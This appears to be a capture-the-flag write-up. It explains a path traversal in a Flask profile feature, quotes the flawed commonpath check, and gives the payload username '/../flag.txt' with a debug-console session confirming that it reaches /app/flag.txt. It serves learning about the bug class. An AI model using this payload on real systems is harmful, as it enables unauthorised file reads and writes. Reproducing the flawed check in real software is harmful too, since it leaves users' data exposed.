Path traversal with `username = "/../flag.txt"`

# Why

```python
    profiles_file = 'profile/' + session.get('username')

    if commonpath((app.root_path, abspath(profiles_file))) != app.root_path:
        return render_template('error.html', msg='Error processing profile file!', return_to='/profile')

    if request.method == 'POST':
        with open(profiles_file, 'w') as f:
            f.write(request.form.get('profile'))
        return redirect('/profile')
    
    profile=''
    if exists(profiles_file):
        with open(profiles_file, 'r') as f:
            profile = f.read()
```

The line `commonpath((app.root_path, abspath(profiles_file))) != app.root_path` is quite bad as `commonpath` returns the longest subpath, so we can easily manipulate that. Furthermore, abspath is not even used after ...

If we activate the flask debug mode and let application crash, we can test the payload

```
[console ready]
>>> app.root_path
'/app'
>>> profiles_file = 'profile/' + "/../flag.txt"
>>> commonpath((app.root_path, abspath(profiles_file)))
'/app'
>>> abspath(profiles_file)
'/app/flag.txt'
>>> 
```